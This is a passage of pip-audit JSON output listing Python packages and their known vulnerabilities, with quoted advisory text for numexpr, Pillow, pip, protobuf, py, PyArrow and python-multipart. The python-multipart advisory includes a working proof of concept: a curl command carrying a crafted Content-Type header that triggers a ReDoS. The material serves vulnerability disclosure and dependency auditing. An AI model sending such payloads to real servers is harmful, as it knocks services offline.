{"name": "notebook", "version": "6.5.4", "vulns": []}, {"name": "notebook-shim", "version": "0.2.2", "vulns": []}, {"name": "numba", "version": "0.57.0", "vulns": []}, {"name": "numexpr", "version": "2.8.4", "vulns": [{"id": "PYSEC-2023-163", "fix_versions": ["2.8.5"], "aliases": ["CVE-2023-39631"], "description": "An issue in LanChain-ai Langchain v.0.0.245 allows a remote attacker to execute arbitrary code via the evaluate function in the numexpr library."}]}, {"name": "numpy", "version": "1.24.4", "vulns": []}, {"name": "numpydoc", "version": "1.5.0", "vulns": []}, {"name": "oauthlib", "version": "3.2.2", "vulns": []}, {"name": "ocrmac", "version": "1.0.0", "vulns": []}, {"name": "onnxruntime", "version": "1.15.1", "vulns": []}, {"name": "openai", "version": "0.27.8", "vulns": []}, {"name": "openapi-python-client", "version": "0.13.4", "vulns": []}, {"name": "openapi-schema-pydantic", "version": "1.2.4", "vulns": []}, {"name": "opencv-contrib-python", "version": "4.10.0.84", "vulns": []}, {"name": "opencv-python", "version": "4.9.0.80", "vulns": []}, {"name": "openpyxl", "version": "3.1.2", "vulns": []}, {"name": "opentelemetry-api", "version": "1.25.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-common", "version": "1.25.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-http", "version": "1.25.0", "vulns": []}, {"name": "opentelemetry-instrumentation", "version": "0.46b0", "vulns": []}, {"name": "opentelemetry-instrumentation-requests", "version": "0.46b0", "vulns": []}, {"name": "opentelemetry-proto", "version": "1.25.0", "vulns": []}, {"name": "opentelemetry-sdk", "version": "1.25.0", "vulns": []}, {"name": "opentelemetry-semantic-conventions", "version": "0.46b0", "vulns": []}, {"name": "opentelemetry-util-http", "version": "0.46b0", "vulns": []}, {"name": "opt-einsum", "version": "3.3.0", "vulns": []}, {"name": "orjson", "version": "3.10.18", "vulns": []}, {"name": "outcome", "version": "1.2.0", "vulns": []}, {"name": "overrides", "version": "7.4.0", "vulns": []}, {"name": "packageurl-python", "version": "0.17.1", "vulns": []}, {"name": "packaging", "version": "24.2", "vulns": []}, {"name": "paddleocr", "version": "3.0.1", "vulns": []}, {"name": "paddlex", "version": "3.0.1", "vulns": []}, {"name": "paginate", "version": "0.5.6", "vulns": []}, {"name": "pandas", "version": "1.5.3", "vulns": []}, {"name": "pandas-stubs", "version": "2.0.3.230814", "vulns": []}, {"name": "pandocfilters", "version": "1.5.0", "vulns": []}, {"name": "panel", "version": "1.2.1", "vulns": []}, {"name": "param", "version": "1.13.0", "vulns": []}, {"name": "parsel", "version": "1.6.0", "vulns": []}, {"name": "parso", "version": "0.8.3", "vulns": []}, {"name": "partd", "version": "1.2.0", "vulns": []}, {"name": "pathlib", "version": "1.0.1", "vulns": []}, {"name": "pathspec", "version": "0.11.2", "vulns": []}, {"name": "pathtools", "version": "0.1.2", "vulns": []}, {"name": "pathvalidate", "version": "3.2.3", "vulns": []}, {"name": "pathy", "version": "0.10.2", "vulns": []}, {"name": "patsy", "version": "0.5.3", "vulns": []}, {"name": "pbr", "version": "6.1.1", "vulns": []}, {"name": "pdf2image", "version": "1.17.0", "vulns": []}, {"name": "pdfkit", "version": "1.0.0", "vulns": []}, {"name": "peewee", "version": "3.18.1", "vulns": []}, {"name": "pensiev", "version": "0.25.5", "vulns": []}, {"name": "pep8", "version": "1.7.1", "vulns": []}, {"name": "pexpect", "version": "4.8.0", "vulns": []}, {"name": "pickle-mixin", "version": "1.0.2", "vulns": []}, {"name": "pickleshare", "version": "0.7.5", "vulns": []}, {"name": "piexif", "version": "1.1.3", "vulns": []}, {"name": "pillow", "version": "11.0.0", "vulns": [{"id": "PYSEC-2025-61", "fix_versions": ["11.3.0"], "aliases": ["CVE-2025-48379", "GHSA-xg8h-j46f-w952"], "description": "Pillow is a Python imaging library. In versions 11.2.0 to before 11.3.0, there is a heap buffer overflow when writing a sufficiently large (>64k encoded with default settings) image in the DDS format due to writing into a buffer without checking for available space. This only affects users who save untrusted data as a compressed DDS image. This issue has been patched in version 11.3.0."}]}, {"name": "pinecone-client", "version": "2.2.1", "vulns": []}, {"name": "pip", "version": "23.2.1", "vulns": [{"id": "PYSEC-2023-228", "fix_versions": ["23.3"], "aliases": ["CVE-2023-5752"], "description": "When installing a package from a Mercurial VCS URL  (ie \"pip install  hg+...\") with pip prior to v23.3, the specified Mercurial revision could  be used to inject arbitrary configuration options to the \"hg clone\"  call (ie \"--config\"). Controlling the Mercurial configuration can modify  how and which repository is installed. This vulnerability does not  affect users who aren't installing from Mercurial. "}]}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.9.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "pkginfo", "version": "1.9.6", "vulns": []}, {"name": "platformdirs", "version": "4.3.8", "vulns": []}, {"name": "playsound", "version": "1.2.2", "vulns": []}, {"name": "plotly", "version": "5.9.0", "vulns": []}, {"name": "pluggy", "version": "1.5.0", "vulns": []}, {"name": "ply", "version": "3.11", "vulns": []}, {"name": "portalocker", "version": "2.7.0", "vulns": []}, {"name": "posthog", "version": "3.0.2", "vulns": []}, {"name": "poyo", "version": "0.5.0", "vulns": []}, {"name": "pprintpp", "version": "0.4.0", "vulns": []}, {"name": "pre-commit", "version": "3.4.0", "vulns": []}, {"name": "prefmate", "skip_reason": "Dependency not found on PyPI and could not be audited: prefmate (0.1.0)"}, {"name": "premailer", "version": "3.10.0", "vulns": []}, {"name": "preshed", "version": "3.0.8", "vulns": []}, {"name": "prettytable", "version": "3.16.0", "vulns": []}, {"name": "priority", "version": "2.0.0", "vulns": []}, {"name": "prometheus-client", "version": "0.14.1", "vulns": []}, {"name": "prompt-toolkit", "version": "3.0.48", "vulns": []}, {"name": "protego", "version": "0.1.16", "vulns": []}, {"name": "protobuf", "version": "4.24.2", "vulns": [{"id": "GHSA-8qvm-5x2c-j2w7", "fix_versions": ["4.25.8", "5.29.5", "6.31.1"], "aliases": ["CVE-2025-4565"], "description": "### Summary Any project that uses Protobuf pure-Python backend to parse untrusted Protocol Buffers data containing an arbitrary number of **recursive groups**, **recursive messages** or **a series of [`SGROUP`](https://protobuf.dev/programming-guides/encoding/#groups) tags** can be corrupted by exceeding the Python recursion limit.  Reporter: Alexis Challande, Trail of Bits Ecosystem Security Team [ecosystem@trailofbits.com](mailto:ecosystem@trailofbits.com)  Affected versions: This issue only affects the [pure-Python implementation](https://github.com/protocolbuffers/protobuf/tree/main/python#implementation-backends) of protobuf-python backend. This is the implementation when `PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python` environment variable is set or the default when protobuf is used from Bazel or pure-Python PyPi wheels. CPython PyPi wheels do not use pure-Python by default.  This is a Python variant of a [previous issue affecting protobuf-java](https://github.com/protocolbuffers/protobuf/security/advisories/GHSA-735f-pc8j-v9w8).  ### Severity This is a potential Denial of Service. Parsing nested protobuf data creates unbounded recursions that can be abused by an attacker.  ### Proof of Concept For reproduction details, please refer to the unit tests [decoder_test.py](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/decoder_test.py#L87-L98) and [message_test](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/message_test.py#L1436-L1478)  ### Remediation and Mitigation A mitigation is available now. Please update to the latest available versions of the following packages: * protobuf-python(4.25.8, 5.29.5, 6.31.1)"}]}, {"name": "psutil", "version": "6.1.1", "vulns": []}, {"name": "psycopg2-binary", "version": "2.9.9", "vulns": []}, {"name": "ptyprocess", "version": "0.7.0", "vulns": []}, {"name": "pulsar-client", "version": "3.3.0", "vulns": []}, {"name": "pure-eval", "version": "0.2.2", "vulns": []}, {"name": "py", "version": "1.11.0", "vulns": [{"id": "PYSEC-2022-42969", "fix_versions": [], "aliases": ["CVE-2022-42969", "GHSA-w596-4wvx-j9j6"], "description": "The py library through 1.11.0 for Python allows remote attackers to conduct a ReDoS (Regular expression Denial of Service) attack via a Subversion repository with crafted info data, because the InfoSvnCommand argument is mishandled."}]}, {"name": "py-cpuinfo", "version": "8.0.0", "vulns": []}, {"name": "py-serializable", "version": "2.0.0", "vulns": []}, {"name": "pyarrow", "version": "11.0.0", "vulns": [{"id": "PYSEC-2023-238", "fix_versions": ["14.0.1"], "aliases": ["CVE-2023-47248", "GHSA-5wvp-7f3h-6wmm"], "description": "Deserialization of untrusted data in IPC and Parquet readers in PyArrow versions 0.14.0 to 14.0.0 allows arbitrary code execution. An application is vulnerable if it reads Arrow IPC, Feather or Parquet data from untrusted sources (for example user-supplied input files)."}, {"id": "PYSEC-2024-161", "fix_versions": ["17.0.0"], "aliases": ["CVE-2024-52338"], "description": "Deserialization of untrusted data in IPC and Parquet readers in the Apache Arrow R package versions\u00a04.0.0 through 16.1.0 allows arbitrary code execution. An application is vulnerable if it  reads Arrow IPC, Feather or Parquet data from untrusted sources (for  example, user-supplied input files). This vulnerability only affects the arrow R package, not other Apache Arrow  implementations or bindings unless those bindings are specifically used via the R package (for example, an R application that embeds a Python interpreter and uses PyArrow to read files from untrusted sources is still vulnerable if the arrow R package is an affected version). It is recommended that users of the arrow R package upgrade to 17.0.0 or later. Similarly, it  is recommended that downstream libraries upgrade their dependency  requirements to arrow 17.0.0 or later. If using an affected version of the package, untrusted data can read into a Table and its internal to_data_frame() method can be used as a workaround (e.g., read_parquet(..., as_data_frame = FALSE)$to_data_frame()).   This issue affects the Apache Arrow R package: from 4.0.0 through 16.1.0.   Users are recommended to upgrade to version 17.0.0, which fixes the issue."}]}, {"name": "pyasn1", "version": "0.4.8", "vulns": []}, {"name": "pyasn1-modules", "version": "0.2.8", "vulns": []}, {"name": "pyautogui", "version": "0.9.54", "vulns": []}, {"name": "pyclipper", "version": "1.3.0.post6", "vulns": []}, {"name": "pycodestyle", "version": "2.11.1", "vulns": []}, {"name": "pycosat", "skip_reason": "Dependency not found on PyPI and could not be audited: pycosat (0.6.4)"}, {"name": "pycparser", "version": "2.21", "vulns": []}, {"name": "pycryptodome", "version": "3.21.0", "vulns": []}, {"name": "pyct", "version": "0.5.0", "vulns": []}, {"name": "pycurl", "version": "7.45.2", "vulns": []}, {"name": "pydantic", "version": "2.9.2", "vulns": []}, {"name": "pydantic-core", "version": "2.23.4", "vulns": []}, {"name": "pydantic-settings", "version": "2.10.1", "vulns": []}, {"name": "pydeck", "version": "0.9.1", "vulns": []}, {"name": "pydispatcher", "version": "2.0.5", "vulns": []}, {"name": "pydocstyle", "version": "6.3.0", "vulns": []}, {"name": "pyerfa", "version": "2.0.0", "vulns": []}, {"name": "pyflakes", "version": "3.1.0", "vulns": []}, {"name": "pygetwindow", "version": "0.0.9", "vulns": []}, {"name": "pygments", "version": "2.18.0", "vulns": []}, {"name": "pyinquirer", "version": "1.0.3", "vulns": []}, {"name": "pyjwt", "version": "2.4.0", "vulns": []}, {"name": "pylance", "version": "0.5.10", "vulns": []}, {"name": "pylatexenc", "version": "2.10", "vulns": []}, {"name": "pylint", "version": "2.16.2", "vulns": []}, {"name": "pylint-venv", "version": "2.3.0", "vulns": []}, {"name": "pyls-spyder", "version": "0.4.0", "vulns": []}, {"name": "pymdown-extensions", "version": "10.3", "vulns": []}, {"name": "pymsgbox", "version": "1.0.9", "vulns": []}, {"name": "pynput", "version": "1.7.6", "vulns": []}, {"name": "pyobjc", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-core", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-accessibility", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-accounts", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-addressbook", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-adservices", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-adsupport", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-applescriptkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-applescriptobjc", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-applicationservices", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-apptrackingtransparency", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-audiovideobridging", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-authenticationservices", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-automaticassessmentconfiguration", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-automator", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-avfoundation", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-avkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-avrouting", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-backgroundassets", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-browserenginekit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-businesschat", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-calendarstore", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-callkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-cfnetwork", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-cinematic", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-classkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-cloudkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-cocoa", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-collaboration", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-colorsync", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-contacts", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-contactsui", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-coreaudio", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-coreaudiokit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-corebluetooth", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-coredata", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-corehaptics", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-corelocation", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-coremedia", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-coremediaio", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-coremidi", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-coreml", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-coremotion", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-coreservices", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-corespotlight", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-coretext", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-corewlan", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-cryptotokenkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-datadetection", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-devicecheck", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-dictionaryservices", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-discrecording", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-discrecordingui", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-diskarbitration", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-dvdplayback", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-eventkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-exceptionhandling", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-executionpolicy", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-extensionkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-externalaccessory", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-fileprovider", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-fileproviderui", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-findersync", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-fsevents", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-gamecenter", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-gamecontroller", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-gamekit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-gameplaykit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-healthkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-imagecapturecore", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-inputmethodkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-installerplugins", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-instantmessage", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-intents", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-intentsui", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-iobluetooth", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-iobluetoothui", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-iosurface", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-ituneslibrary", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-kernelmanagement", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-latentsemanticmapping", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-launchservices", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-libdispatch", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-libxpc", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-linkpresentation", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-localauthentication", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-localauthenticationembeddedui", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-mailkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-mapkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-mediaaccessibility", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-medialibrary", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-mediaplayer", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-mediatoolbox", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-metal", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-metalfx", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-metalkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-metalperformanceshaders", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-metalperformanceshadersgraph", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-metrickit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-mlcompute", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-modelio", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-multipeerconnectivity", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-naturallanguage", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-netfs", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-network", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-networkextension", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-notificationcenter", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-opendirectory", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-osakit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-oslog", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-passkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-pencilkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-phase", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-photos", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-photosui", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-preferencepanes", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-pushkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-quartz", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-quicklookthumbnailing", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-replaykit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-safariservices", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-safetykit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-scenekit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-screencapturekit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-screensaver", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-screentime", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-scriptingbridge", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-searchkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-security", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-securityfoundation", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-securityinterface", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-sensitivecontentanalysis", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-servicemanagement", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-sharedwithyou", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-sharedwithyoucore", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-shazamkit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-social", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-soundanalysis", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-speech", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-spritekit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-storekit", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-symbols", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-syncservices", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-systemconfiguration", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-systemextensions", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-threadnetwork", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-uniformtypeidentifiers", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-usernotifications", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-usernotificationsui", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-videosubscriberaccount", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-videotoolbox", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-virtualization", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-vision", "version": "10.3.2", "vulns": []}, {"name": "pyobjc-framework-webkit", "version": "10.3.2", "vulns": []}, {"name": "pyodbc", "version": "4.0.34", "vulns": []}, {"name": "pyopenssl", "version": "23.2.0", "vulns": []}, {"name": "pyparsing", "version": "3.0.9", "vulns": []}, {"name": "pypdf2", "version": "3.0.1", "vulns": []}, {"name": "pypdfium2", "version": "4.30.1", "vulns": []}, {"name": "pyperclip", "version": "1.9.0", "vulns": []}, {"name": "pypika", "version": "0.48.9", "vulns": []}, {"name": "pyproject-hooks", "version": "1.0.0", "vulns": []}, {"name": "pyqt5-sip", "version": "12.11.0", "vulns": []}, {"name": "pyqt6", "version": "6.5.2", "vulns": []}, {"name": "pyqt6-qt6", "version": "6.5.2", "vulns": []}, {"name": "pyqt6-sip", "version": "13.5.2", "vulns": []}, {"name": "pyrect", "version": "0.2.0", "vulns": []}, {"name": "pyrsistent", "version": "0.18.0", "vulns": []}, {"name": "pysam", "version": "0.21.0", "vulns": []}, {"name": "pyscreeze", "version": "1.0.1", "vulns": []}, {"name": "pysocks", "version": "1.7.1", "vulns": []}, {"name": "pytesseract", "version": "0.3.13", "vulns": []}, {"name": "pytest", "version": "7.2.2", "vulns": []}, {"name": "pytest-asyncio", "version": "0.21.1", "vulns": []}, {"name": "pytest-benchmark", "version": "4.0.0", "vulns": []}, {"name": "pytest-clarity", "version": "1.0.1", "vulns": []}, {"name": "pytest-cov", "version": "4.1.0", "vulns": []}, {"name": "pytest-depends", "version": "1.0.1", "vulns": []}, {"name": "pytest-doctestplus", "version": "1.4.0", "vulns": []}, {"name": "pytest-env", "version": "1.1.5", "vulns": []}, {"name": "pytest-factoryboy", "version": "2.7.0", "vulns": []}, {"name": "pytest-flake8", "version": "1.3.0", "vulns": []}, {"name": "pytest-html", "version": "4.1.1", "vulns": []}, {"name": "pytest-httpserver", "version": "1.1.3", "vulns": []}, {"name": "pytest-integration", "version": "0.2.3", "vulns": []}, {"name": "pytest-json-report", "version": "1.5.0", "vulns": []}, {"name": "pytest-metadata", "version": "3.1.1", "vulns": []}, {"name": "pytest-mock", "version": "3.12.0", "vulns": []}, {"name": "pytest-mypy", "version": "0.10.3", "vulns": []}, {"name": "pytest-pdb", "version": "0.3.1", "vulns": []}, {"name": "pytest-randomly", "version": "3.16.0", "vulns": []}, {"name": "pytest-recording", "version": "0.13.0", "vulns": []}, {"name": "pytest-sugar", "version": "1.0.0", "vulns": []}, {"name": "pytest-timeout", "version": "2.2.0", "vulns": []}, {"name": "pytest-watch", "version": "4.2.0", "vulns": []}, {"name": "pytest-xdist", "version": "3.5.0", "vulns": []}, {"name": "python-dateutil", "version": "2.8.2", "vulns": []}, {"name": "python-docx", "version": "0.8.11", "vulns": []}, {"name": "python-dotenv", "version": "1.0.0", "vulns": []}, {"name": "python-engineio", "version": "4.12.2", "vulns": []}, {"name": "python-json-logger", "version": "2.0.7", "vulns": []}, {"name": "python-lsp-black", "version": "1.2.1", "vulns": []}, {"name": "python-lsp-jsonrpc", "version": "1.0.0", "vulns": []}, {"name": "python-lsp-server", "version": "1.7.2", "vulns": []}, {"name": "python-multipart", "version": "0.0.6", "vulns": [{"id": "GHSA-2jv5-9r88-3w3p", "fix_versions": ["0.0.7"], "aliases": ["CVE-2024-24762"], "description": "### Summary  When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.  An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.  This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS  This only applies when the app uses form data, parsed with `python-multipart`.  ### Details  A regular HTTP `Content-Type` header could look like:  ``` Content-Type: text/html; charset=utf-8 ```  `python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74  A custom option could be made and sent to the server to break it with:  ``` Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ```  ### PoC  Create a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:  ```Python # main.py from wsgiref.simple_server import make_server from wsgiref.validate import validator  from multipart.multipart import parse_options_header   def simple_app(environ, start_response):     _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])      start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])     return [b\"Ok\"]   httpd = make_server(\"\", 8123, validator(simple_app)) print(\"Serving on port 8123...\") httpd.serve_forever() ```  Then send the attacking request with:  ```console $ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/' ```  ### Impact  This is a ReDoS, (Regular expression Denial of Service), so it only applies to those using python-multipart to read form data, such as Starlette and FastAPI.  ### Original Report  This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r  <details> <summary>Original report to FastAPI</summary>  Hey Tiangolo!  My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from 